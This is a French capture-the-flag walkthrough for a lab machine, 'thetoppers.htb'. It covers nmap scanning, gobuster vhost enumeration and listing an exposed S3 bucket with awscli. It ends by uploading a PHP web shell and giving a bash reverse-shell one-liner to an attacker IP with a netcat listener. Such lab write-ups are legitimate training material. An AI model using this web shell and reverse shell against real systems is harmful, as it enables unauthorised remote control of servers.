---

---
### About machine
---
#### Ip:

```
10.129.179.40
```

#### OS : 
Ubuntu

### Step 1 : nmap 
---
```
$ sudo nmap -sC -sV 10.129.179.40 
```

![[Pasted image 20250216090131.png]]
**2 ports** overts:
 -**22/tcp** utilisant le seervice **ssh** avec la version **OpenSSH 7.6p1 Ubuntu 4ubuntu0.7**
 -**80/tcp** utilisant le service **http** avec la version **Apache/2.4.29**
### step 2:
---
En l'absence d'un serveur DNS, le fichier que l'on peut utiliser sous Linux pour résoudre les noms d'hôte en adresses IP est : **/etc/hosts**
nous devrons donc ajouter une entrée dans le */etc/hosts* pour ce domaine pour permettre au navigateur de résoudre l'adresse de thetoppers.htb%%domain of the email address provided in the "Contact" section of the website%% 


```
echo "10.129.179.40 thetoppers.htb" | sudo tee -a /etc/hosts
```

### Step 3: énumeration des sous-domaines(gobusters)
---
Pour énumerer les sous-domaines avec **gobuster**, on utlise la commande:

```
gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
```
**vhost** : pour la brute-force
**-w**: chemin vers la wordlist
**-u**: pour spécifier l'URL

![[Pasted image 20250216104250.png]]On doit maintenant ajouter une entrée pour ce sous domaine dans **/etc/host**:
```
10.129.227.248 s3.thetoppers.htb
```
Et puis le lancer dans le navigateur ou avec **curl**:
![[Pasted image 20250216104515.png]]
La page affiche seulement un fichier JSON. Cela nous amène à l'étape suivante

### Step 4: bucket S3 
---

n **S3 bucket** (Simple Storage Service) est un service de stockage d'objets proposé par **Amazon Web Services (AWS)**. Il permet de stocker et de récupérer n'importe quelle quantité de données à tout moment et de n'importe où. Les S3 buckets sont souvent utilisés pour héberger des fichiers statiques comme des images, des vidéos, des documents, etc.

Pour interragir avec le service **S3 bucket** on utilise la commande : **awscli**
-Installation : 
```
apt install awscli
```
-configuration:
```
aws configure
```
Mettre tout ce qu'il demande en **temp**
![[Pasted image 20250216111535.png]]

-pour répertorier les **s3 buckets** on utilise la commande:
```
aws s3 ls
```
  pour plus de précision:
```
  aws --endpoint=http://s3.thetoppers.htb s3 l
```
![[Pasted image 20250216112038.png]]

### Step 5: PHP
---
- **création d'un fichier php**:

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
- **Télécharger ce shell PHP dans le bucket thetoppers.htb S3 à l'aide de la commande suivante**:
```
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```
- Execution de la commande **id** à l'aide du *paramètre* **url** 

  ![[Pasted image 20250216115138.png]]

- Obtenons un shell inversé en créant un nouveau fichier shell.sh contenant la charge utile du shell inverse bash suivantequi se reconnectera à notre machine locale sur le port 1337
```
 bash
 bash -i >& /dev/tcp/10.10.15.181/1337 0>&1
```

- Nous allons démarrer un écouteur **ncat** sur notre port local **1337** à l'aide de la commande suivante:
```
 nc -nvlp 1337
```
